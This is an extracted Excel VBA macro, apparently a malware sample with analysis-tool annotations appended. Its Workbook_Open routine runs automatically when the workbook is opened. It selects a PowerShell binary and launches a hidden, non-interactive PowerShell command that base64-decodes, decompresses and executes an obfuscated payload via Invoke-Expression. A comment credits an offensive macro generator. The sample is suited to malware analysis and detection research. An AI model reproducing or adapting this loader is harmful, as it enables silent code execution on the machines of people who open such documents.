Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Sub Workbook_Open()

'VBA arch detect suggested by "T"

Dim Command As String

Dim str As String

Dim exec As String



Arch = Environ("PROCESSOR_ARCHITECTURE")

windir = Environ("windir")

If Arch = "AMD64" Then

    Command = windir + "\syswow64\windowspowershell\v1.0\powershell.exe"

Else

    Command = "powershell.exe"

End If



str = "nVPbattAEH3XVwxCEAlLQomdUhwCuRS3gdYNUWgfjB/k9STeZrUrdk"

str = str + "e2lNT/3lEit01IS6lfjrw7c86ZywYCjuHE92bvlLooK2Mp9O"

str = str + "/QalTDg3SplB/NoaoXSgpwVBADNsT3cKHpkix8kZbqQp0qZU"

str = str + "TYn21iqKUmaHpse7yPjv5b59xiQXi9YljudOqedx3DL+X+6z"

str = str + "ft/qRT9088su1D4LjoKW6Sz4tvKAjy1hGW6RQpzY24Q3I9Qj"

str = str + "h75e50ubTo3KQopWrn4zELoOWAjbF3MbyW8YTXbYUcnhMXUb"

str = str + "4eeGkNGWFUH3otqsgLXHputGaj4d5eDCP+RfAdTE2JrpU6gq"

str = str + "Dicman1hadm6dOXWhuoxYY+ouW0Oe0iAMbDmS6KxQo1xgG1Q"

str = str + "uie77PvKD9B77ZmSS2tUbLxXdWDbdheMCccRYNDju1dpbNO8"

str = str + "LmbOJtVlIhhKyQKPp7cgQPnZPBc6ttHNwPDuP9+M/9naji1j"

str = str + "Hb1GiMYOvdGMuK8nifvUjWRRh1X4MBK7C5QHbudnQvHL1HOu"

str = str + "NCXTjjLZqzkQ+FXiqMOCvZn2+9gDiXFyHpJgVJieUC7Tu8kV"

str = str + "qSNBoCAcm0KBH8r1IPD3xINP9zVSEQHk8mtRZdpIOkKpyjla"

str = str + "27AR0HNB4/e1RZHLTpR9S3tIqzZphlGcMoi7yd86takywxfV"

str = str + "xDU+Vo11KgSz8V1q0K1Y3QVG3XQch4bk/PYR4GTbprexTF8F"

str = str + "OEF452U+/fGyvGQRN3kD3fmJwKS0muECtIchRGL+Htm1GWbU"

str = str + "VBYvWw/QE="



exec = Command + " -NoP -NonI -W Hidden -Command ""Invoke-E"

exec = exec + "xpression $(New-Object IO.StreamReader ($(New-Ob"

exec = exec + "ject IO.Compression.DeflateStream ($(New-Object "

exec = exec + "IO.MemoryStream (,$([Convert]::FromBase64String("

exec = exec + "\"" " & str & " \"" )))), [IO.Compression.Compre"

exec = exec + "ssionMode]::Decompress)), [Text.Encoding]::ASCII"

exec = exec + ")).ReadToEnd();"""



Shell exec, vbHide



End Sub



'---Generated by macro_safe.py by khr0x40sh---



'---VBA arch detection by "T"---



' InQuest injected base64 decoded content
' {iMO
' L87J
' 3lOw
' '&j}ai
' KkTl
' }K{H

INQUEST-PP=macro
